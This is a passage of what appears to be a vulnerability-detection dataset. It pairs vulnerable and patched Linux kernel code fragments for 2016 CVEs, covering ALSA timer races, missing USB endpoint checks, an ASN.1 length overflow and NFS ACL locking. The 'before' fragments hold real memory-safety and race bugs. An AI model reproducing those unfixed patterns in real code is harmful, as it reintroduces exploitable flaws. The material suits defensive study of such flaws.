 spin_unlock_irqrestore(&slave_active_lock, flags);
 return 1; /* delayed start */
}
 if (!keep_flag) {
 spin_lock_irqsave(&slave_active_lock, flags);
			timeri->flags &= ~SNDRV_TIMER_IFLG_RUNNING;
 list_del_init(&timeri->ack_list);
 list_del_init(&timeri->active_list);
 spin_unlock_irqrestore(&slave_active_lock, flags);
		}
 goto __end;
"
2016,DoS ,CVE-2016-2546," struct timespec tstamp;		/* trigger tstamp */
 wait_queue_head_t qchange_sleep;
 struct fasync_struct *fasync;
 struct mutex tread_sem;
};

/* list of timers */
 return -ENOMEM;
 spin_lock_init(&tu->qlock);
 init_waitqueue_head(&tu->qchange_sleep);
 mutex_init(&tu->tread_sem);
	tu->ticks = 1;
	tu->queue_size = 128;
	tu->queue = kmalloc(tu->queue_size * sizeof(struct snd_timer_read),
 if (file->private_data) {
		tu = file->private_data;
		file->private_data = NULL;

 if (tu->timeri)
 snd_timer_close(tu->timeri);

 kfree(tu->queue);
 kfree(tu->tqueue);
 kfree(tu);
 int err = 0;

	tu = file->private_data;
 mutex_lock(&tu->tread_sem);
 if (tu->timeri) {
 snd_timer_close(tu->timeri);
		tu->timeri = NULL;
	}

      __err:
 mutex_unlock(&tu->tread_sem);
 return err;
}

	SNDRV_TIMER_IOCTL_PAUSE_OLD = _IO('T', 0x23),
};

static long snd_timer_user_ioctl(struct file *file, unsigned int cmd,
 unsigned long arg)
{
 struct snd_timer_user *tu;
	{
 int xarg;

 mutex_lock(&tu->tread_sem);
 if (tu->timeri)	{	/* too late */
 mutex_unlock(&tu->tread_sem);
 return -EBUSY;
		}
 if (get_user(xarg, p)) {
 mutex_unlock(&tu->tread_sem);
 return -EFAULT;
		}
		tu->tread = xarg ? 1 : 0;
 mutex_unlock(&tu->tread_sem);
 return 0;
	}
 case SNDRV_TIMER_IOCTL_GINFO:
 return -ENOTTY;
}













static int snd_timer_user_fasync(int fd, struct file * file, int on)
{
 struct snd_timer_user *tu;
"," struct timespec tstamp;		/* trigger tstamp */
 wait_queue_head_t qchange_sleep;
 struct fasync_struct *fasync;
 struct mutex ioctl_lock;
};

/* list of timers */
 return -ENOMEM;
 spin_lock_init(&tu->qlock);
 init_waitqueue_head(&tu->qchange_sleep);
 mutex_init(&tu->ioctl_lock);
	tu->ticks = 1;
	tu->queue_size = 128;
	tu->queue = kmalloc(tu->queue_size * sizeof(struct snd_timer_read),
 if (file->private_data) {
		tu = file->private_data;
		file->private_data = NULL;
 mutex_lock(&tu->ioctl_lock);
 if (tu->timeri)
 snd_timer_close(tu->timeri);
 mutex_unlock(&tu->ioctl_lock);
 kfree(tu->queue);
 kfree(tu->tqueue);
 kfree(tu);
 int err = 0;

	tu = file->private_data;

 if (tu->timeri) {
 snd_timer_close(tu->timeri);
		tu->timeri = NULL;
	}

      __err:

 return err;
}

	SNDRV_TIMER_IOCTL_PAUSE_OLD = _IO('T', 0x23),
};

static long __snd_timer_user_ioctl(struct file *file, unsigned int cmd,
 unsigned long arg)
{
 struct snd_timer_user *tu;
	{
 int xarg;

 if (tu->timeri)	/* too late */


 return -EBUSY;
 if (get_user(xarg, p))


 return -EFAULT;

		tu->tread = xarg ? 1 : 0;

 return 0;
	}
 case SNDRV_TIMER_IOCTL_GINFO:
 return -ENOTTY;
}

static long snd_timer_user_ioctl(struct file *file, unsigned int cmd,
 unsigned long arg)
{
 struct snd_timer_user *tu = file->private_data;
 long ret;

 mutex_lock(&tu->ioctl_lock);
	ret = __snd_timer_user_ioctl(file, cmd, arg);
 mutex_unlock(&tu->ioctl_lock);
 return ret;
}

static int snd_timer_user_fasync(int fd, struct file * file, int on)
{
 struct snd_timer_user *tu;
"
2016,DoS ,CVE-2016-2545,"		} else {
			ti->flags &= ~SNDRV_TIMER_IFLG_RUNNING;
 if (--timer->running)
 list_del(&ti->active_list);
		}
 if ((timer->hw.flags & SNDRV_TIMER_HW_TASKLET) ||
		    (ti->flags & SNDRV_TIMER_IFLG_FAST))
","		} else {
			ti->flags &= ~SNDRV_TIMER_IFLG_RUNNING;
 if (--timer->running)
 list_del_init(&ti->active_list);
		}
 if ((timer->hw.flags & SNDRV_TIMER_HW_TASKLET) ||
		    (ti->flags & SNDRV_TIMER_IFLG_FAST))
"
2016,DoS ,CVE-2016-2544,"static void queue_delete(struct snd_seq_queue *q)
{
 /* stop and release the timer */

 snd_seq_timer_stop(q->timer);
 snd_seq_timer_close(q);

 /* wait until access free */
 snd_use_lock_sync(&q->use_lock);
 /* release resources... */
","static void queue_delete(struct snd_seq_queue *q)
{
 /* stop and release the timer */
 mutex_lock(&q->timer_mutex);
 snd_seq_timer_stop(q->timer);
 snd_seq_timer_close(q);
 mutex_unlock(&q->timer_mutex);
 /* wait until access free */
 snd_use_lock_sync(&q->use_lock);
 /* release resources... */
"
2016,DoS ,CVE-2016-2543,"		 * No restrictions so for a user client we can clear
		 * the whole fifo
 */
 if (client->type == USER_CLIENT)
 snd_seq_fifo_clear(client->data.user.fifo);
	}

","		 * No restrictions so for a user client we can clear
		 * the whole fifo
 */
 if (client->type == USER_CLIENT && client->data.user.fifo)
 snd_seq_fifo_clear(client->data.user.fifo);
	}

"
2016,DoS ,CVE-2016-2384," else
		err = snd_usbmidi_create_endpoints(umidi, endpoints);
 if (err < 0) {
 snd_usbmidi_free(umidi);
 return err;
	}

"," else
		err = snd_usbmidi_create_endpoints(umidi, endpoints);
 if (err < 0) {

 return err;
	}

"
2016,#NAME?,CVE-2016-2383," /* adjust offset of jmps if necessary */
 if (i < pos && i + insn->off + 1 > pos)
			insn->off += delta;
 else if (i > pos && i + insn->off + 1 < pos)
			insn->off -= delta;
	}
}
"," /* adjust offset of jmps if necessary */
 if (i < pos && i + insn->off + 1 > pos)
			insn->off += delta;
 else if (i > pos + delta && i + insn->off + 1 <= pos + delta)
			insn->off -= delta;
	}
}
"
2016,DoS ,CVE-2016-2188,"	iface_desc = interface->cur_altsetting;
	dev->product_id = le16_to_cpu(udev->descriptor.idProduct);







 /* set up the endpoint information */
 for (i = 0; i < iface_desc->desc.bNumEndpoints; ++i) {
		endpoint = &iface_desc->endpoint[i].desc;
","	iface_desc = interface->cur_altsetting;
	dev->product_id = le16_to_cpu(udev->descriptor.idProduct);

 if (iface_desc->desc.bNumEndpoints < 1) {
 dev_err(&interface->dev, ""Invalid number of endpoints\n"");
		retval = -EINVAL;
 goto error;
	}

 /* set up the endpoint information */
 for (i = 0; i < iface_desc->desc.bNumEndpoints; ++i) {
		endpoint = &iface_desc->endpoint[i].desc;
"
2016,DoS ,CVE-2016-2187," goto err_free_buf;
	}









 /*
	 * The endpoint is always altsetting 0, we know this since we know
	 * this device only has one interrupt endpoint
	 * HID report descriptor
 */
 if (usb_get_extra_descriptor(usbinterface->cur_altsetting,
				     HID_DEVICE_TYPE, &hid_desc) != 0){
 dev_err(&usbinterface->dev,
 ""Can't retrieve exta USB descriptor to get hid report descriptor length\n"");
		error = -EIO;
"," goto err_free_buf;
	}

 /* Sanity check that a device has an endpoint */
 if (usbinterface->altsetting[0].desc.bNumEndpoints < 1) {
 dev_err(&usbinterface->dev,
 ""Invalid number of endpoints\n"");
		error = -EINVAL;
 goto err_free_urb;
	}

 /*
	 * The endpoint is always altsetting 0, we know this since we know
	 * this device only has one interrupt endpoint
	 * HID report descriptor
 */
 if (usb_get_extra_descriptor(usbinterface->cur_altsetting,
				     HID_DEVICE_TYPE, &hid_desc) != 0) {
 dev_err(&usbinterface->dev,
 ""Can't retrieve exta USB descriptor to get hid report descriptor length\n"");
		error = -EIO;
"
2016,DoS ,CVE-2016-2186," int error = -ENOMEM;

	interface = intf->cur_altsetting;



	endpoint = &interface->endpoint[0].desc;
 if (!usb_endpoint_is_int_in(endpoint))
 return -EIO;
"," int error = -ENOMEM;

	interface = intf->cur_altsetting;
 if (interface->desc.bNumEndpoints < 1)
 return -EINVAL;

	endpoint = &interface->endpoint[0].desc;
 if (!usb_endpoint_is_int_in(endpoint))
 return -EIO;
"
2016,DoS ,CVE-2016-2185,"
	ar2->udev = udev;








	ar2->intf[0] = interface;
	ar2->ep[0] = &alt->endpoint[0].desc;


	ar2->intf[1] = usb_ifnum_to_if(udev, 1);







	r = usb_driver_claim_interface(&ati_remote2_driver, ar2->intf[1], ar2);
 if (r)
 goto fail1;


	alt = ar2->intf[1]->cur_altsetting;






	ar2->ep[1] = &alt->endpoint[0].desc;

	r = ati_remote2_urb_init(ar2);
 if (r)
 goto fail2;

	ar2->channel_mask = channel_mask;
	ar2->mode_mask = mode_mask;

	r = ati_remote2_setup(ar2, ar2->channel_mask);
 if (r)
 goto fail2;

 usb_make_path(udev, ar2->phys, sizeof(ar2->phys));
 strlcat(ar2->phys, ""/input0"", sizeof(ar2->phys));

	r = sysfs_create_group(&udev->dev.kobj, &ati_remote2_attr_group);
 if (r)
 goto fail2;

	r = ati_remote2_input_init(ar2);
 if (r)
 goto fail3;

 usb_set_intfdata(interface, ar2);

	interface->needs_remote_wakeup = 1;

 return 0;

 fail3:
 sysfs_remove_group(&udev->dev.kobj, &ati_remote2_attr_group);
 fail2:
 ati_remote2_urb_cleanup(ar2);

 usb_driver_release_interface(&ati_remote2_driver, ar2->intf[1]);
 fail1:
 kfree(ar2);
","
	ar2->udev = udev;

 /* Sanity check, first interface must have an endpoint */
 if (alt->desc.bNumEndpoints < 1 || !alt->endpoint) {
 dev_err(&interface->dev,
 ""%s(): interface 0 must have an endpoint\n"", __func__);
		r = -ENODEV;
 goto fail1;
	}
	ar2->intf[0] = interface;
	ar2->ep[0] = &alt->endpoint[0].desc;

 /* Sanity check, the device must have two interfaces */
	ar2->intf[1] = usb_ifnum_to_if(udev, 1);
 if ((udev->actconfig->desc.bNumInterfaces < 2) || !ar2->intf[1]) {
 dev_err(&interface->dev, ""%s(): need 2 interfaces, found %d\n"",
			__func__, udev->actconfig->desc.bNumInterfaces);
		r = -ENODEV;
 goto fail1;
	}

	r = usb_driver_claim_interface(&ati_remote2_driver, ar2->intf[1], ar2);
 if (r)
 goto fail1;

 /* Sanity check, second interface must have an endpoint */
	alt = ar2->intf[1]->cur_altsetting;
 if (alt->desc.bNumEndpoints < 1 || !alt->endpoint) {
 dev_err(&interface->dev,
 ""%s(): interface 1 must have an endpoint\n"", __func__);
		r = -ENODEV;
 goto fail2;
	}
	ar2->ep[1] = &alt->endpoint[0].desc;

	r = ati_remote2_urb_init(ar2);
 if (r)
 goto fail3;

	ar2->channel_mask = channel_mask;
	ar2->mode_mask = mode_mask;

	r = ati_remote2_setup(ar2, ar2->channel_mask);
 if (r)
 goto fail3;

 usb_make_path(udev, ar2->phys, sizeof(ar2->phys));
 strlcat(ar2->phys, ""/input0"", sizeof(ar2->phys));

	r = sysfs_create_group(&udev->dev.kobj, &ati_remote2_attr_group);
 if (r)
 goto fail3;

	r = ati_remote2_input_init(ar2);
 if (r)
 goto fail4;

 usb_set_intfdata(interface, ar2);

	interface->needs_remote_wakeup = 1;

 return 0;

 fail4:
 sysfs_remove_group(&udev->dev.kobj, &ati_remote2_attr_group);
 fail3:
 ati_remote2_urb_cleanup(ar2);
 fail2:
 usb_driver_release_interface(&ati_remote2_driver, ar2->intf[1]);
 fail1:
 kfree(ar2);
"
2016,DoS ,CVE-2016-2184,"	}
	alts = &iface->altsetting[fp->altset_idx];
	altsd = get_iface_desc(alts);






	fp->protocol = altsd->bInterfaceProtocol;

 if (fp->datainterval == 0)
","	}
	alts = &iface->altsetting[fp->altset_idx];
	altsd = get_iface_desc(alts);
 if (altsd->bNumEndpoints < 1) {
 kfree(fp);
 kfree(rate_table);
 return -EINVAL;
	}

	fp->protocol = altsd->bInterfaceProtocol;

 if (fp->datainterval == 0)
"
2016,DoS ,CVE-2016-2143,"static inline int init_new_context(struct task_struct *tsk,
 struct mm_struct *mm)
{



 cpumask_clear(&mm->context.cpu_attach_mask);
 atomic_set(&mm->context.attach_count, 0);
	mm->context.flush_mm = 0;
	mm->context.asce_bits = _ASCE_TABLE_LENGTH | _ASCE_USER_BITS;
	mm->context.asce_bits |= _ASCE_TYPE_REGION3;
#ifdef CONFIG_PGSTE
	mm->context.alloc_pgste = page_table_allocate_pgste;
	mm->context.has_pgste = 0;
	mm->context.use_skey = 0;
#endif
	mm->context.asce_limit = STACK_TOP_MAX;







 crst_table_init((unsigned long *) mm->pgd, pgd_entry_type(mm));
 return 0;
}
static inline void arch_dup_mmap(struct mm_struct *oldmm,
 struct mm_struct *mm)
{
 if (oldmm->context.asce_limit < mm->context.asce_limit)
 crst_table_downgrade(mm, oldmm->context.asce_limit);
}

static inline void arch_exit_mmap(struct mm_struct *mm)

static inline pgd_t *pgd_alloc(struct mm_struct *mm)
{
 spin_lock_init(&mm->context.list_lock);
 INIT_LIST_HEAD(&mm->context.pgtable_list);
 INIT_LIST_HEAD(&mm->context.gmap_list);
 return (pgd_t *) crst_table_alloc(mm);















}
#define pgd_free(mm, pgd) crst_table_free(mm, (unsigned long *) pgd)

static inline void pmd_populate(struct mm_struct *mm,
 pmd_t *pmd, pgtable_t pte)
","static inline int init_new_context(struct task_struct *tsk,
 struct mm_struct *mm)
{
 spin_lock_init(&mm->context.list_lock);
 INIT_LIST_HEAD(&mm->context.pgtable_list);
 INIT_LIST_HEAD(&mm->context.gmap_list);
 cpumask_clear(&mm->context.cpu_attach_mask);
 atomic_set(&mm->context.attach_count, 0);
	mm->context.flush_mm = 0;


#ifdef CONFIG_PGSTE
	mm->context.alloc_pgste = page_table_allocate_pgste;
	mm->context.has_pgste = 0;
	mm->context.use_skey = 0;
#endif
 if (mm->context.asce_limit == 0) {
 /* context created by exec, set asce limit to 4TB */
		mm->context.asce_bits = _ASCE_TABLE_LENGTH |
			_ASCE_USER_BITS | _ASCE_TYPE_REGION3;
		mm->context.asce_limit = STACK_TOP_MAX;
	} else if (mm->context.asce_limit == (1UL << 31)) {
 mm_inc_nr_pmds(mm);
	}
 crst_table_init((unsigned long *) mm->pgd, pgd_entry_type(mm));
 return 0;
}
static inline void arch_dup_mmap(struct mm_struct *oldmm,
 struct mm_struct *mm)
{


}

static inline void arch_exit_mmap(struct mm_struct *mm)

static inline pgd_t *pgd_alloc(struct mm_struct *mm)
{
 unsigned long *table = crst_table_alloc(mm);

 if (!table)
 return NULL;
 if (mm->context.asce_limit == (1UL << 31)) {
 /* Forking a compat process with 2 page table levels */
 if (!pgtable_pmd_page_ctor(virt_to_page(table))) {
 crst_table_free(mm, table);
 return NULL;
		}
	}
 return (pgd_t *) table;
}

static inline void pgd_free(struct mm_struct *mm, pgd_t *pgd)
{
 if (mm->context.asce_limit == (1UL << 31))
 pgtable_pmd_page_dtor(virt_to_page(pgd));
 crst_table_free(mm, (unsigned long *) pgd);
}


static inline void pmd_populate(struct mm_struct *mm,
 pmd_t *pmd, pgtable_t pte)
"
2016,#NAME?,CVE-2016-2117,"
	err = -EIO;

	netdev->hw_features = NETIF_F_SG | NETIF_F_HW_VLAN_CTAG_RX;
	netdev->features |= (NETIF_F_HW_VLAN_CTAG_TX | NETIF_F_HW_VLAN_CTAG_RX);

 /* Init PHY as early as possible due to power saving issue  */
","
	err = -EIO;

	netdev->hw_features = NETIF_F_HW_VLAN_CTAG_RX;
	netdev->features |= (NETIF_F_HW_VLAN_CTAG_TX | NETIF_F_HW_VLAN_CTAG_RX);

 /* Init PHY as early as possible due to power saving issue  */
"
2016,,CVE-2016-2085,"#include <linux/integrity.h>
#include <linux/evm.h>
#include <crypto/hash.h>

#include ""evm.h""

int evm_initialized;
				   xattr_value_len, calc.digest);
 if (rc)
 break;
		rc = memcmp(xattr_data->digest, calc.digest,
 sizeof(calc.digest));
 if (rc)
			rc = -EINVAL;
","#include <linux/integrity.h>
#include <linux/evm.h>
#include <crypto/hash.h>
#include <crypto/algapi.h>
#include ""evm.h""

int evm_initialized;
				   xattr_value_len, calc.digest);
 if (rc)
 break;
		rc = crypto_memneq(xattr_data->digest, calc.digest,
 sizeof(calc.digest));
 if (rc)
			rc = -EINVAL;
"
2016,DoS ,CVE-2016-2070," int newly_acked_sacked = prior_unsacked -
				 (tp->packets_out - tp->sacked_out);




	tp->prr_delivered += newly_acked_sacked;
 if (delta < 0) {
		u64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +
"," int newly_acked_sacked = prior_unsacked -
				 (tp->packets_out - tp->sacked_out);

 if (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))
 return;

	tp->prr_delivered += newly_acked_sacked;
 if (delta < 0) {
		u64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +
"
2016,#NAME?,CVE-2016-2069,"#endif
 cpumask_set_cpu(cpu, mm_cpumask(next));

 /* Re-load page tables */

























 load_cr3(next->pgd);

 trace_tlb_flush(TLB_FLUSH_ON_TASK_SWITCH, TLB_FLUSH_ALL);

 /* Stop flush ipis for the previous mm */
			 * schedule, protecting us from simultaneous changes.
 */
 cpumask_set_cpu(cpu, mm_cpumask(next));

 /*
			 * We were in lazy tlb mode and leave_mm disabled
			 * tlb flush IPI delivery. We must reload CR3
			 * to make sure to use no freed page tables.




 */
 load_cr3(next->pgd);
 trace_tlb_flush(TLB_FLUSH_ON_TASK_SWITCH, TLB_FLUSH_ALL);
 preempt_disable();

 count_vm_tlb_event(NR_TLB_LOCAL_FLUSH_ALL);


 local_flush_tlb();

 trace_tlb_flush(TLB_LOCAL_SHOOTDOWN, TLB_FLUSH_ALL);
 if (cpumask_any_but(mm_cpumask(mm), smp_processor_id()) < nr_cpu_ids)
 flush_tlb_others(mm_cpumask(mm), mm, 0UL, TLB_FLUSH_ALL);
 unsigned long base_pages_to_flush = TLB_FLUSH_ALL;

 preempt_disable();
 if (current->active_mm != mm)



 goto out;


 if (!current->mm) {
 leave_mm(smp_processor_id());




 goto out;
	}

 if ((end != TLB_FLUSH_ALL) && !(vmflag & VM_HUGETLB))
		base_pages_to_flush = (end - start) >> PAGE_SHIFT;





 if (base_pages_to_flush > tlb_single_page_flush_ceiling) {
		base_pages_to_flush = TLB_FLUSH_ALL;
 count_vm_tlb_event(NR_TLB_LOCAL_FLUSH_ALL);
 preempt_disable();

 if (current->active_mm == mm) {
 if (current->mm)




 __flush_tlb_one(start);
 else
 leave_mm(smp_processor_id());




	}

 if (cpumask_any_but(mm_cpumask(mm), smp_processor_id()) < nr_cpu_ids)
","#endif
 cpumask_set_cpu(cpu, mm_cpumask(next));

 /*
		 * Re-load page tables.
		 *
		 * This logic has an ordering constraint:
		 *
		 *  CPU 0: Write to a PTE for 'next'
		 *  CPU 0: load bit 1 in mm_cpumask.  if nonzero, send IPI.
		 *  CPU 1: set bit 1 in next's mm_cpumask
		 *  CPU 1: load from the PTE that CPU 0 writes (implicit)
		 *
		 * We need to prevent an outcome in which CPU 1 observes
		 * the new PTE value and CPU 0 observes bit 1 clear in
		 * mm_cpumask.  (If that occurs, then the IPI will never
		 * be sent, and CPU 0's TLB will contain a stale entry.)
		 *
		 * The bad outcome can occur if either CPU's load is
		 * reordered before that CPU's store, so both CPUs much
		 * execute full barriers to prevent this from happening.
		 *
		 * Thus, switch_mm needs a full barrier between the
		 * store to mm_cpumask and any operation that could load
		 * from next->pgd.  This barrier synchronizes with
		 * remote TLB flushers.  Fortunately, load_cr3 is
		 * serializing and thus acts as a full barrier.
		 *
 */
 load_cr3(next->pgd);

 trace_tlb_flush(TLB_FLUSH_ON_TASK_SWITCH, TLB_FLUSH_ALL);

 /* Stop flush ipis for the previous mm */
			 * schedule, protecting us from simultaneous changes.
 */
 cpumask_set_cpu(cpu, mm_cpumask(next));

 /*
			 * We were in lazy tlb mode and leave_mm disabled
			 * tlb flush IPI delivery. We must reload CR3
			 * to make sure to use no freed page tables.
			 *
			 * As above, this is a barrier that forces
			 * TLB repopulation to be ordered after the
			 * store to mm_cpumask.
 */
 load_cr3(next->pgd);
 trace_tlb_flush(TLB_FLUSH_ON_TASK_SWITCH, TLB_FLUSH_ALL);
 preempt_disable();

 count_vm_tlb_event(NR_TLB_LOCAL_FLUSH_ALL);

 /* This is an implicit full barrier that synchronizes with switch_mm. */
 local_flush_tlb();

 trace_tlb_flush(TLB_LOCAL_SHOOTDOWN, TLB_FLUSH_ALL);
 if (cpumask_any_but(mm_cpumask(mm), smp_processor_id()) < nr_cpu_ids)
 flush_tlb_others(mm_cpumask(mm), mm, 0UL, TLB_FLUSH_ALL);
 unsigned long base_pages_to_flush = TLB_FLUSH_ALL;

 preempt_disable();
 if (current->active_mm != mm) {
 /* Synchronize with switch_mm. */
 smp_mb();

 goto out;
	}

 if (!current->mm) {
 leave_mm(smp_processor_id());

 /* Synchronize with switch_mm. */
 smp_mb();

 goto out;
	}

 if ((end != TLB_FLUSH_ALL) && !(vmflag & VM_HUGETLB))
		base_pages_to_flush = (end - start) >> PAGE_SHIFT;

 /*
	 * Both branches below are implicit full barriers (MOV to CR or
	 * INVLPG) that synchronize with switch_mm.
 */
 if (base_pages_to_flush > tlb_single_page_flush_ceiling) {
		base_pages_to_flush = TLB_FLUSH_ALL;
 count_vm_tlb_event(NR_TLB_LOCAL_FLUSH_ALL);
 preempt_disable();

 if (current->active_mm == mm) {
 if (current->mm) {
 /*
			 * Implicit full barrier (INVLPG) that synchronizes
			 * with switch_mm.
 */
 __flush_tlb_one(start);
 } else {
 leave_mm(smp_processor_id());

 /* Synchronize with switch_mm. */
 smp_mb();
		}
	}

 if (cpumask_any_but(mm_cpumask(mm), smp_processor_id()) < nr_cpu_ids)
"
2016,DoS Overflow +Priv ,CVE-2016-2068,,
2016,#NAME?,CVE-2016-2067,,
2016,DoS +Priv Mem. Corr. ,CVE-2016-2066,,
2016,DoS Mem. Corr. ,CVE-2016-2065,,
2016,DoS ,CVE-2016-2064,,
2016,DoS Overflow ,CVE-2016-2063,,
2016,DoS Overflow ,CVE-2016-2062,,
2016,DoS Overflow +Priv Mem. Corr. ,CVE-2016-2061,,
2016,DoS +Priv ,CVE-2016-2059,,
2016,DoS ,CVE-2016-2053," unsigned char tmp;

 /* Skip conditional matches if possible */
 if ((op & ASN1_OP_MATCH__COND &&
		     flags & FLAG_MATCHED) ||
		    dp == datalen) {
			flags &= ~FLAG_LAST_MATCHED;
			pc += asn1_op_lengths[op];
 goto next_op;
"," unsigned char tmp;

 /* Skip conditional matches if possible */
 if ((op & ASN1_OP_MATCH__COND && flags & FLAG_MATCHED) ||
		    (op & ASN1_OP_MATCH__SKIP && dp == datalen)) {

			flags &= ~FLAG_LAST_MATCHED;
			pc += asn1_op_lengths[op];
 goto next_op;
"
2016,DoS Overflow +Priv ,CVE-2016-1583,"#include <linux/slab.h>
#include <linux/wait.h>
#include <linux/mount.h>

#include ""ecryptfs_kernel.h""

struct ecryptfs_open_req {
	flags |= IS_RDONLY(d_inode(lower_dentry)) ? O_RDONLY : O_RDWR;
	(*lower_file) = dentry_open(&req.path, flags, cred);
 if (!IS_ERR(*lower_file))
 goto out;
 if ((flags & O_ACCMODE) == O_RDONLY) {
		rc = PTR_ERR((*lower_file));
 goto out;
 mutex_unlock(&ecryptfs_kthread_ctl.mux);
 wake_up(&ecryptfs_kthread_ctl.wait);
 wait_for_completion(&req.done);
 if (IS_ERR(*lower_file))
		rc = PTR_ERR(*lower_file);








out:
 return rc;
}
","#include <linux/slab.h>
#include <linux/wait.h>
#include <linux/mount.h>
#include <linux/file.h>
#include ""ecryptfs_kernel.h""

struct ecryptfs_open_req {
	flags |= IS_RDONLY(d_inode(lower_dentry)) ? O_RDONLY : O_RDWR;
	(*lower_file) = dentry_open(&req.path, flags, cred);
 if (!IS_ERR(*lower_file))
 goto have_file;
 if ((flags & O_ACCMODE) == O_RDONLY) {
		rc = PTR_ERR((*lower_file));
 goto out;
 mutex_unlock(&ecryptfs_kthread_ctl.mux);
 wake_up(&ecryptfs_kthread_ctl.wait);
 wait_for_completion(&req.done);
 if (IS_ERR(*lower_file)) {
		rc = PTR_ERR(*lower_file);
 goto out;
	}
have_file:
 if ((*lower_file)->f_op->mmap == NULL) {
 fput(*lower_file);
		*lower_file = NULL;
		rc = -EMEDIUMTYPE;
	}
out:
 return rc;
}
"
2016,#NAME?,CVE-2016-1576,,
2016,#NAME?,CVE-2016-1575,,
2016,Bypass ,CVE-2016-1237," goto out;

	inode = d_inode(fh->fh_dentry);
 if (!IS_POSIXACL(inode) || !inode->i_op->set_acl) {
		error = -EOPNOTSUPP;
 goto out_errno;
	}

	error = fh_want_write(fh);
 if (error)
 goto out_errno;

	error = inode->i_op->set_acl(inode, argp->acl_access, ACL_TYPE_ACCESS);


 if (error)
 goto out_drop_write;
	error = inode->i_op->set_acl(inode, argp->acl_default,
				     ACL_TYPE_DEFAULT);
 if (error)
 goto out_drop_write;



 fh_drop_write(fh);

 posix_acl_release(argp->acl_access);
 posix_acl_release(argp->acl_default);
 return nfserr;
out_drop_write:

 fh_drop_write(fh);
out_errno:
	nfserr = nfserrno(error);
 goto out;

	inode = d_inode(fh->fh_dentry);
 if (!IS_POSIXACL(inode) || !inode->i_op->set_acl) {
		error = -EOPNOTSUPP;
 goto out_errno;
	}

	error = fh_want_write(fh);
 if (error)
 goto out_errno;

	error = inode->i_op->set_acl(inode, argp->acl_access, ACL_TYPE_ACCESS);


 if (error)
 goto out_drop_write;
	error = inode->i_op->set_acl(inode, argp->acl_default,
				     ACL_TYPE_DEFAULT);

out_drop_write:

 fh_drop_write(fh);
out_errno:
	nfserr = nfserrno(error);
	dentry = fhp->fh_dentry;
	inode = d_inode(dentry);

 if (!inode->i_op->set_acl || !IS_POSIXACL(inode))
 return nfserr_attrnotsupp;

 if (S_ISDIR(inode->i_mode))
		flags = NFS4_ACL_DIR;

 if (host_error < 0)
 goto out_nfserr;

	host_error = inode->i_op->set_acl(inode, pacl, ACL_TYPE_ACCESS);


 if (host_error < 0)
 goto out_release;

 if (S_ISDIR(inode->i_mode)) {
		host_error = inode->i_op->set_acl(inode, dpacl,
						  ACL_TYPE_DEFAULT);
	}

out_release:


 posix_acl_release(pacl);
 posix_acl_release(dpacl);
out_nfserr:
"," goto out;

	inode = d_inode(fh->fh_dentry);





	error = fh_want_write(fh);
 if (error)
 goto out_errno;

 fh_lock(fh);

	error = set_posix_acl(inode, ACL_TYPE_ACCESS, argp->acl_access);
 if (error)
 goto out_drop_lock;
	error = set_posix_acl(inode, ACL_TYPE_DEFAULT, argp->acl_default);

 if (error)
 goto out_drop_lock;

 fh_unlock(fh);

 fh_drop_write(fh);

 posix_acl_release(argp->acl_access);
 posix_acl_release(argp->acl_default);
 return nfserr;
out_drop_lock:
 fh_unlock(fh);
 fh_drop_write(fh);
out_errno:
	nfserr = nfserrno(error);
 goto out;

	inode = d_inode(fh->fh_dentry);





	error = fh_want_write(fh);
 if (error)
 goto out_errno;

 fh_lock(fh);

	error = set_posix_acl(inode, ACL_TYPE_ACCESS, argp->acl_access);
 if (error)
 goto out_drop_lock;
	error = set_posix_acl(inode, ACL_TYPE_DEFAULT, argp->acl_default);


out_drop_lock:
 fh_unlock(fh);
 fh_drop_write(fh);
out_errno:
	nfserr = nfserrno(error);
	dentry = fhp->fh_dentry;
	inode = d_inode(dentry);




 if (S_ISDIR(inode->i_mode))
		flags = NFS4_ACL_DIR;

 if (host_error < 0)
 goto out_nfserr;

 fh_lock(fhp);

	host_error = set_posix_acl(inode, ACL_TYPE_ACCESS, pacl);
 if (host_error < 0)
 goto out_drop_lock;

 if (S_ISDIR(inode->i_mode)) {
		host_error = set_posix_acl(inode, ACL_TYPE_DEFAULT, dpacl);

	}

out_drop_lock:
 fh_unlock(fhp);

 posix_acl_release(pacl);
 posix_acl_release(dpacl);
out_nfserr:
"
2016,#NAME?,CVE-2016-0823,"
static int pagemap_open(struct inode *inode, struct file *file)
{



 pr_warn_once(""Bits 55-60 of /proc/PID/pagemap entries are about ""
 ""to stop being page-shift some time soon. See the ""
 ""linux/Documentation/vm/pagemap.txt for details.\n"");
","
static int pagemap_open(struct inode *inode, struct file *file)
{
 /* do not disclose physical addresses: attack vector */
 if (!capable(CAP_SYS_ADMIN))
 return -EPERM;
 pr_warn_once(""Bits 55-60 of /proc/PID/pagemap entries are about ""
 ""to stop being page-shift some time soon. See the ""
 ""linux/Documentation/vm/pagemap.txt for details.\n"");
"
2016,Bypass ,CVE-2016-0821," * under normal circumstances, used to verify that nobody uses
 * non-initialized list entries.
 */
#define LIST_POISON1  ((void *) 0x00100100 + POISON_POINTER_DELTA)
#define LIST_POISON2  ((void *) 0x00200200 + POISON_POINTER_DELTA)

/********** include/linux/timer.h **********/
/*
"," * under normal circumstances, used to verify that nobody uses
 * non-initialized list entries.
 */
#define LIST_POISON1  ((void *) 0x100 + POISON_POINTER_DELTA)
#define LIST_POISON2  ((void *) 0x200 + POISON_POINTER_DELTA)

/********** include/linux/timer.h **********/
/*
"
2016,DoS +Priv ,CVE-2016-0774,,
2016,Overflow +Priv ,CVE-2016-0758,"
 /* Extract a tag from the data */
	tag = data[dp++];
 if (tag == 0) {
 /* It appears to be an EOC. */
 if (data[dp++] != 0)
 goto invalid_eoc;

 /* Extract the length */
	len = data[dp++];
 if (len <= 0x7f) {
		dp += len;
 goto next_tag;
	}

 if (unlikely(len == ASN1_INDEFINITE_LENGTH)) {
 /* Indefinite length */
	}

	n = len - 0x80;
 if (unlikely(n > sizeof(size_t) - 1))
 goto length_too_long;
 if (unlikely(n > datalen - dp))
 goto data_overrun_error;
 for (len = 0; n > 0; n--) {

		len <<= 8;
		len |= data[dp++];
	}



	dp += len;
 goto next_tag;

","
 /* Extract a tag from the data */
	tag = data[dp++];
 if (tag == ASN1_EOC) {
 /* It appears to be an EOC. */
 if (data[dp++] != 0)
 goto invalid_eoc;

 /* Extract the length */
	len = data[dp++];
 if (len <= 0x7f)
 goto check_length;



